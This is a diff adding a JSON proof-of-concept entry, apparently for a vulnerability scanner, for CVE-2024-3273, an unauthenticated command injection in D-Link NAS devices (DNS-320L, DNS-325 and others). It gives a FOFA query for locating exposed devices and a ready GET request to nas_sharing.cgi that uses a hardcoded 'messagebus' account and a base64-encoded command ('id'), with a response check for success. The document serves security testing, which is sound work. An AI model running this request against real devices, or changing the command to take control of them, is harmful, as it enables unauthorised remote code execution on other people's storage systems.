@@ -1,0 +1,35 @@
+{
+  "product": "D-LinkNAS",
+  "vul_name": "D-LinkNAS nas_sharing.cgi 远程代码执行",
+  "type": "代码执行",
+  "vul_id": [
+    "CVE-2024-3273"
+  ],
+  "level": 3,
+  "vul_desc": "D-Link DNS-320L存在命令注入漏洞，未授权的攻击者可以通过该漏洞进行远程代码执行，从而控制服务器。",
+  "version": "D-Link DNS-320L，DNS-325，DNS-327，DNS-340L，D-Link NAS Storage。",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"Text:In order to access the ShareCenter\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/wan___she__pi/article/details/137589775",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
